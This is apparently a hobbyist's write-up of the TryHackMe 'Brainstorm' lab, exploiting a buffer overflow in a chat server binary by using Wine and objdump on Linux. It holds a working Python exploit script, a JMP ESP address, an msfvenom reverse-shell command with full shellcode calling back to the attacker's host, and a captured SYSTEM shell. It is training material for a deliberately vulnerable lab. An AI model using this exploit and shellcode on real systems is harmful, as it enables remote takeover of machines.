![Brainstorm](https://tryhackme-images.s3.amazonaws.com/room-icons/616a8d84bdacec4150a220e66cb215d2.jpeg)

# [Brainstorm](https://tryhackme.com/room/brainstorm)

## Introduction

This will be my first attempt at a tryhackme walkthrough, and certainly no testimony to my individual skill.  Closer to reality is I'm stubborn as a mule and I detested running a windows VM on a perfectly good linux box.  It may be 2021, and Windows 10 VM images might be free, but I still remember the 90s.

So after applying my new found [buffer overflow skills](https://tryhackme.com/room/bufferoverflowprep), completing the room, and following the walkthroughs kindly created by others ([@TCM](https://www.youtube.com/watch?v=T1-Sds8ZHBU&feature=youtu.be),[@sawinskii](https://github.com/sawinskii/TryHackMe/blob/master/Brainstorm/Brainstorm.pdf), & [@Noxious](https://noxious.tech/posts/Brainstorm/))  I figured I would try to complete the room without a VM and without any unnecessary tools.

## Let's get started

Task 1 is to simply deploy the machine and do a bit of reconnaissance.  Don't forget your `-Pn` flag as the machine doesn't respond to ICMP:

`nmap -A -vv -oN nmap.txt -Pn 10.10.51.160`

The relevant ports here are:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 16:03 +08
Nmap scan report for 10.10.51.160
Host is up (0.36s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2021-01-14T08:06:20+00:00
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2021-01-13T07:47:51
|_Not valid after:  2021-07-15T07:47:51
|_ssl-date: 2021-01-14T08:06:51+00:00; 0s from scanner time.
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
```
So it is a windows box, with an anonymous FTP server, and an interesting 9999 port running an unknown service called **Brainstorm chat**

'ncat 10.10.51.160 9999'
```
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): brassmonkey
Write a message: that funky monkey 


Thu Jan 14 00:19:51 2021
brassmonkey said: that funky monkey


Write a message:  brass monkey junkie


Thu Jan 14 00:20:04 2021
brassmonkey said: brass monkey junkie


Write a message:  that funky monkey


Thu Jan 14 00:20:13 2021
brassmonkey said: that funky monkey
```
The chat server just takes a username and then repeats whatever message you give after adding a timestamp.

Let's see if either of those inputs are vulnerable to an overflow.

`python -c "print('brassmonkey'*250)"`

```
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): brassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkey
Write a message: saymyname


Thu Jan 14 00:34:35 2021
brassmonkeybrassmonk said: saymyname


Write a message:  brassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkeybrassmonkey
Ncat: Connection reset by peer.
```
So the username input correctly limits itself to 20 characters, but the message field resets the connection.  That looks to be our vuln but it also unfortunately means we've crashed the service on the target machine.....

Let's go check out the FTP server:

`ftp !:1`  *bash shortcut to re-use the 1st argument (IP address) from our previous ncat command*
```
Connected to 10.10.51.160.
220 Microsoft FTP Service
Name (10.10.51.160:rturner): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  07:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-29-19  09:26PM                43747 chatserver.exe
08-29-19  09:27PM                30761 essfunc.dll
```

Looks like that is our binary and an associated dll.  

*Now I didn't know this previously, but apparently just transferring binaries via FTP can corrupt them unless you change your mode.  I won't say how long into setting up my first virtualbox that I figured this out....*

```
ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: chatserver.exe remote: chatserver.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
43747 bytes received in 1.9 seconds (22.5 kbytes/s)
local: essfunc.dll remote: essfunc.dll
200 PORT command successful.
150 Opening BINARY mode data connection.
226 Transfer complete.
30761 bytes received in 1.46 seconds (20.6 kbytes/s)
```
## A fork in the road

So it is at this point that we arrive at the fork in the road.  Instead of launching a Windows VM and using the combintion of Immunity Debugger and Mona, we will be using wine(dbg) and objdump to examine the executable outside of the VM.

### Sandboxing

Running in a VM is one form of sandboxing, and the [ArchWiki](https://wiki.archlinux.org/index.php/wine#Running_Wine_under_a_separate_user_account) for Wine recommends either sandboxing WINE applications or at least running under an unprivileged separate user account.  Anytime you are running untrusted binaries keep this in mind, particularly if you are stepping outside of a VM or dedicated testing box.

### Winedbg

Let's spin up WINE and get started disassembling. 

`pacman -S wine`

*Note that the first time you run WINE, in order to run this executable WINE will automatically prompt to install some additional dependencies*

Wine comes with an integrated debugger, winedbg, which will let you disassemble, print registers, dump the stack, and otherwise inspect the binary.  The relevant commands you'll be using to do so are below.

- `cont` Winedbg opens with an immediate breakpoint.  Continue the program.
- `info registers` Prints the register values
- `info stack [len]` Dumps the stack up to the specified len in words
- `info share` Shows the imported modules
- `disassemble [addr],[addr]` Prints the disassembly of the provided addresses

Finally you can install objdump (part of binutils under ArchLinux) to have an easier way to disassemble the essfunc.dll.

Now we can get started with our *usual* buffer overflow process.

#### Confirming the overflow

Let's start by writing a string of "A"s to the message input and see if EIP gets overwritten.

##### Terminal Winedbg

```
[wineuser@SSDarchlinux Program Files (x86)]$ winedbg chatserver.exe 
WineDbg starting on pid 0108
0x000000007bc51929 EntryPoint+0xffffffffffffffff in ntdll: ret
Wine-dbg>cont
```

##### Terminal Python

```
python -c "print('A'*2500)"
```

##### Terminal Netcat

```
[wineuser@SSDarchlinux brainstorm]$ ncat 127.0.0.1 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): eipoffset
Write a message: AAAAAAAAAA.........
```

##### Terminal Winedbg

```
Unhandled exception: page fault on read access to 0x41414141 in 32-bit code (0x0000000041414141).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:41414141 ESP:00b4ee60 EBP:41414141 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:00b4e680 EBX:0000d644 ECX:00b4e680 EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x0000000000b4ee60:  4141414141414141 4141414141414141
0x0000000000b4ee70:  4141414141414141 4141414141414141
0x0000000000b4ee80:  4141414141414141 4141414141414141
0x0000000000b4ee90:  4141414141414141 4141414141414141
0x0000000000b4eea0:  4141414141414141 4141414141414141
0x0000000000b4eeb0:  4141414141414141 4141414141414141
0x0000000000b4eec0:  4141414141414141 4141414141414141
0x0000000000b4eed0:  4141414141414141 4141414141414141
0x0000000000b4eee0:  4141414141414141 4141414141414141
0x0000000000b4eef0:  4141414141414141 4141414141414141
0x0000000000b4ef00:  4141414141414141 4141414141414141
0x0000000000b4ef10:  4141414141414141 4141414141414141
Backtrace:
=>0 0x0000000041414141 (0x0000000041414141)
0x0000000041414141: -- no code accessible --
```

Above you can see we've overwritten EIP, EBP and the stack with ASCII "A".  

#### Determining the offset

Now let's generate a more unique sequence to determine the exact offset where the buffer overflow exists and at what point we overwrite the Instruction Pointer.

##### Terminal Python

```
[wineuser@SSDarchlinux brainstorm]$ python
Python 3.9.1 (default, Dec 13 2020, 11:55:53) 
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import string
>>> payload = ""
>>> for a in string.ascii_uppercase:
...     for b in string.ascii_lowercase:
...             for c in string.digits:
...                     payload += a+b+c
... 
>>> payload[0:2500]
'Aa0Aa1Aa2Aa3.............
```

##### Terminal Winedbg

```
Unhandled exception: page fault on read access to 0x31704330 in 32-bit code (0x0000000031704330).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:31704330 ESP:00b4ee60 EBP:7043396f EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:00b4e680 EBX:0000d6d2 ECX:00b4e680 EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x0000000000b4ee60:  7043337043327043 4336704335704334
0x0000000000b4ee70:  3970433870433770 7143317143307143
0x0000000000b4ee80:  4334714333714332 3771433671433571
0x0000000000b4ee90:  7243397143387143 4332724331724330
0x0000000000b4eea0:  3572433472433372 7243377243367243
0x0000000000b4eeb0:  4330734339724338 3373433273433173
0x0000000000b4eec0:  7343357343347343 4338734337734336
0x0000000000b4eed0:  3174433074433973 7443337443327443
0x0000000000b4eee0:  4336744335744334 3974433874433774
0x0000000000b4eef0:  7543317543307543 4334754333754332
0x0000000000b4ef00:  3775433675433575 7643397543387543
0x0000000000b4ef10:  4332764331764330 3576433476433376
Backtrace:
=>0 0x0000000031704330 (0x000000007043396f)
0x0000000031704330: -- no code accessible --
```

Now you can see a nice repeating sequence in the stack and EIP is 31704330.  Back to python to find the offset in our payload sequence.

##### Terminal Python

```
>>> payload.find(str(bytes.fromhex('30437031'), 'utf-8'))
2012
```
Remember that your EIP address is little endian so you need to reverse the hex string above.

*Note that you can do the same thing using the metasploit framework using the below commands.*

```
[wineuser@SSDarchlinux ~]$ /opt/metasploit/tools/exploit/pattern_create.rb -l 2500
[wineuser@SSDarchlinux ~]$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 31704330
[*] Exact match at offset 2012
```

Now let's confirm we can control EIP by writing "BBBB" to it.

##### Terminal Python

```
[wineuser@SSDarchlinux ~]$ python -c "print('A'*2012+'BBBB')"
```

##### Terminal Winedbg

```
Unhandled exception: page fault on read access to 0x42424242 in 32-bit code (0x0000000042424242).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:42424242 ESP:00b4ee60 EBP:41414141 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:00b4e680 EBX:0000d9f4 ECX:00b4e680 EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x0000000000b4ee60:  00270d980027000a 0000000000001000
0x0000000000b4ee70:  0000000000000000 0000000000000000
0x0000000000b4ee80:  0000000000000000 0000000000000000
0x0000000000b4ee90:  0000000000000000 0000000000000000
0x0000000000b4eea0:  0000000000000000 0000000000000000
0x0000000000b4eeb0:  0000000000000000 0000000000000000
0x0000000000b4eec0:  0000000000000000 0000000000000000
0x0000000000b4eed0:  0000000000000000 0000000000000000
0x0000000000b4eee0:  0000000000000000 0000000000000000
0x0000000000b4eef0:  0000000000000000 0000000000000000
0x0000000000b4ef00:  0000000000000000 0000000000000000
0x0000000000b4ef10:  0000000000000000 0000000000000000
Backtrace:
=>0 0x0000000042424242 (0x0000000041414141)
0x0000000042424242: -- no code accessible --
```

#### Finding badchars

Now let's test for badchars and at the same time start setting up our exploit script.

##### Terminal Python

```
[wineuser@SSDarchlinux ~]$ vim exploit.py

import sys, socket

target = sys.argv[1]
port = 9999
user = b"brassmonkey"

offset = 2012
buffer = b"A"
EIP = b"B"*4


badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 

payload = buffer * offset + EIP + badchars

try:
    print("Sending buffer to: " + target+":"+str(port))
    s = socket.socket()
    s.connect((target,port))
    s.recv(1024)
    s.send(user + b'\r\n')
    s.recv(1024)
    s.send(payload + b'\r\n')
    s.recv(1024)

except Exception as e:
    print(e)
    sys.exit()

finally:
    s.close()
    
```

##### Terminal Netcat

```
[wineuser@SSDarchlinux ~]$ python exploit.py 127.0.0.1
Sending buffer to: 127.0.0.1:9999
```

##### Terminal Winedbg

```
Unhandled exception: page fault on read access to 0x42424242 in 32-bit code (0x0000000042424242).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:42424242 ESP:00d5ee60 EBP:41414141 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:00d5e680 EBX:0000dab8 ECX:00d5e680 EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x0000000000d5ee60:  0807060504030201 100f0e0d0c0b0a09
0x0000000000d5ee70:  1817161514131211 201f1e1d1c1b1a19
0x0000000000d5ee80:  2827262524232221 302f2e2d2c2b2a29
0x0000000000d5ee90:  3837363534333231 403f3e3d3c3b3a39
0x0000000000d5eea0:  4847464544434241 504f4e4d4c4b4a49
0x0000000000d5eeb0:  5857565554535251 605f5e5d5c5b5a59
0x0000000000d5eec0:  6867666564636261 706f6e6d6c6b6a69
0x0000000000d5eed0:  7877767574737271 807f7e7d7c7b7a79
0x0000000000d5eee0:  8887868584838281 908f8e8d8c8b8a89
0x0000000000d5eef0:  9897969594939291 a09f9e9d9c9b9a99
0x0000000000d5ef00:  a8a7a6a5a4a3a2a1 b0afaeadacabaaa9
0x0000000000d5ef10:  b8b7b6b5b4b3b2b1 c0bfbebdbcbbbab9
Backtrace:
=>0 0x0000000042424242 (0x0000000041414141)
0x0000000042424242: -- no code accessible --
Wine-dbg>info stack 32
Stack dump:
0x0000000000d5ee60:  0807060504030201 100f0e0d0c0b0a09
0x0000000000d5ee70:  1817161514131211 201f1e1d1c1b1a19
0x0000000000d5ee80:  2827262524232221 302f2e2d2c2b2a29
0x0000000000d5ee90:  3837363534333231 403f3e3d3c3b3a39
0x0000000000d5eea0:  4847464544434241 504f4e4d4c4b4a49
0x0000000000d5eeb0:  5857565554535251 605f5e5d5c5b5a59
0x0000000000d5eec0:  6867666564636261 706f6e6d6c6b6a69
0x0000000000d5eed0:  7877767574737271 807f7e7d7c7b7a79
0x0000000000d5eee0:  8887868584838281 908f8e8d8c8b8a89
0x0000000000d5eef0:  9897969594939291 a09f9e9d9c9b9a99
0x0000000000d5ef00:  a8a7a6a5a4a3a2a1 b0afaeadacabaaa9
0x0000000000d5ef10:  b8b7b6b5b4b3b2b1 c0bfbebdbcbbbab9
0x0000000000d5ef20:  c8c7c6c5c4c3c2c1 d0cfcecdcccbcac9
0x0000000000d5ef30:  d8d7d6d5d4d3d2d1 e0dfdedddcdbdad9
0x0000000000d5ef40:  e8e7e6e5e4e3e2e1 f0efeeedecebeae9
0x0000000000d5ef50:  f8f7f6f5f4f3f2f1 0dfffefdfcfbfaf9
```

So this is the biggest part where I missed the mona tool set as nobody can love the task of reading each badchar and checking for completeness. In this case its easy and only '\x00' is invalid.  It's also worth noting that I wasn't able to get winedbg to work with gdb or radare2 and therefore I wasn't able to get any other exploit tools to work to do this comparison automatically.  Something I'll look into in the future and any tips are welcome!

#### Redirecting execution

In order to redirect execution we need to point EIP back to the stack which we can overwrite.  So we need to find a `JMP ESP` assembly instruction in a memory address we can point EIP to so that our program will follow EIP --> ESP --> to shell code overflowed onto the stack.  Mona & Immunity can also show you various protections in place in the binary, another area I haven't explored yet outside of the environment.  Instead we will just search both the binary and the dll file for the necessary instruction.

##### Terminal Netcat

```
[wineuser@SSDarchlinux Program Files (x86)]$ objdump -d chatserver.exe | grep jmp.*esp
[wineuser@SSDarchlinux Program Files (x86)]$ objdump -d essfunc.dll | grep jmp.*esp
625014df:	ff e4                	jmp    *%esp
625014eb:	ff e4                	jmp    *%esp
625014f7:	ff e4                	jmp    *%esp
62501503:	ff e4                	jmp    *%esp
6250150f:	ff e4                	jmp    *%esp
6250151b:	ff e4                	jmp    *%esp
62501527:	ff e4                	jmp    *%esp
62501533:	ff e4                	jmp    *%esp
62501535:	ff e4                	jmp    *%esp
62501537:	ff 64 24 f4          	jmp    *-0xc(%esp)
```

In the dll we find around 10 instructions we can use starting with 0x625014df.  You can also see in winedbg itself which modules are imported by the binary and confirm the `jmp esp` instruction at the address.

##### Terminal Winedbg

```
Wine-dbg>info share
Module  Address                 Debug info      Name (7 modules)
PE        400000-  409000       Deferred        chatserver
PE      62500000-6250b000       Deferred        essfunc
PE      6a280000-6a323000       Deferred        msvcrt
PE      7b000000-7b0e4000       Deferred        kernelbase
PE      7b600000-7b817000       Deferred        kernel32
PE      7bc00000-7bc9f000       Dwarf           ntdll
PE      7ee00000-7ee04000       Deferred        ws2_32
Wine-dbg>disassemble 0x625014df
0x00000000625014df EntryPoint+0xbf in essfunc: jmp      *%esp
```

Let's amend our ESP variable to that address.

`ESP = 0x625014df`

and amend our payload to pass that address little endian to EIP after importing the `struct` module

`import sys, socket, struct`
`payload = buffer * offset + struct.pack("<I", EIP)`

now let's generate some shell code

##### Terminal Netcat

```
[wineuser@SSDarchlinux Program Files (x86)]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.14.63 LPORT=8888 -b "\x00" -f python --var-name shellcode EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xbb\xc9\x8f\x42\xdd\xda\xc9\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x52\x31\x5d\x12\x03\x5d\x12"
shellcode += b"\x83\x24\x73\xa0\x28\x4a\x64\xa7\xd3\xb2\x75"
shellcode += b"\xc8\x5a\x57\x44\xc8\x39\x1c\xf7\xf8\x4a\x70"
shellcode += b"\xf4\x73\x1e\x60\x8f\xf6\xb7\x87\x38\xbc\xe1"
shellcode += b"\xa6\xb9\xed\xd2\xa9\x39\xec\x06\x09\x03\x3f"
shellcode += b"\x5b\x48\x44\x22\x96\x18\x1d\x28\x05\x8c\x2a"
shellcode += b"\x64\x96\x27\x60\x68\x9e\xd4\x31\x8b\x8f\x4b"
shellcode += b"\x49\xd2\x0f\x6a\x9e\x6e\x06\x74\xc3\x4b\xd0"
shellcode += b"\x0f\x37\x27\xe3\xd9\x09\xc8\x48\x24\xa6\x3b"
shellcode += b"\x90\x61\x01\xa4\xe7\x9b\x71\x59\xf0\x58\x0b"
shellcode += b"\x85\x75\x7a\xab\x4e\x2d\xa6\x4d\x82\xa8\x2d"
shellcode += b"\x41\x6f\xbe\x69\x46\x6e\x13\x02\x72\xfb\x92"
shellcode += b"\xc4\xf2\xbf\xb0\xc0\x5f\x1b\xd8\x51\x3a\xca"
shellcode += b"\xe5\x81\xe5\xb3\x43\xca\x08\xa7\xf9\x91\x44"
shellcode += b"\x04\x30\x29\x95\x02\x43\x5a\xa7\x8d\xff\xf4"
shellcode += b"\x8b\x46\x26\x03\xeb\x7c\x9e\x9b\x12\x7f\xdf"
shellcode += b"\xb2\xd0\x2b\x8f\xac\xf1\x53\x44\x2c\xfd\x81"
shellcode += b"\xcb\x7c\x51\x7a\xac\x2c\x11\x2a\x44\x26\x9e"
shellcode += b"\x15\x74\x49\x74\x3e\x1f\xb0\x1f\x4b\xe4\xb4"
shellcode += b"\xe0\x23\xe6\xc8\x3c\x0c\x6f\x2e\x2a\x7c\x26"
shellcode += b"\xf9\xc3\xe5\x63\x71\x75\xe9\xb9\xfc\xb5\x61"
shellcode += b"\x4e\x01\x7b\x82\x3b\x11\xec\x62\x76\x4b\xbb"
shellcode += b"\x7d\xac\xe3\x27\xef\x2b\xf3\x2e\x0c\xe4\xa4"
shellcode += b"\x67\xe2\xfd\x20\x9a\x5d\x54\x56\x67\x3b\x9f"
shellcode += b"\xd2\xbc\xf8\x1e\xdb\x31\x44\x05\xcb\x8f\x45"
shellcode += b"\x01\xbf\x5f\x10\xdf\x69\x26\xca\x91\xc3\xf0"
shellcode += b"\xa1\x7b\x83\x85\x89\xbb\xd5\x89\xc7\x4d\x39"
shellcode += b"\x3b\xbe\x0b\x46\xf4\x56\x9c\x3f\xe8\xc6\x63"
shellcode += b"\xea\xa8\xe7\x81\x3e\xc5\x8f\x1f\xab\x64\xd2"
shellcode += b"\x9f\x06\xaa\xeb\x23\xa2\x53\x08\x3b\xc7\x56"
shellcode += b"\x54\xfb\x34\x2b\xc5\x6e\x3a\x98\xe6\xba"
```

Insert the shellcode variable into our exploit script and add it to our payload after a `NOP` slide.

`payload = buffer * offset + struct.pack("<I", EIP) + b"\x90"*20 + shellcode`

And now re-run the exploit......but on our target machine which we've restarted....

##### Terminal Netcat

```
[wineuser@SSDarchlinux ~]$ python exploit.py 10.10.113.42
Sending buffer to: 10.10.113.42:9999

[wineuser@SSDarchlinux Program Files (x86)]$ ncat -lvnp 8888
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.113.42.
Ncat: Connection from 10.10.113.42:49165.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

## Summary

Well that's it.  A virtual box with mona & Immunity were definitely a quicker path here than using wine(dbg).  With that said, by doing both not only did I learn 

- How to setup virtual box
- Windows VM licenses are free
- More practice with Immunity & Mona
- FTP Binary mode

I also got exposed to

- Wine & Winedbg, gdb, & objdump
- Attaching radare to gdb/winedbg processes
- Various linux security concepts
  - Chroot jails
  - Kernel hardening of namespaces
  - Unprivileged user accounts


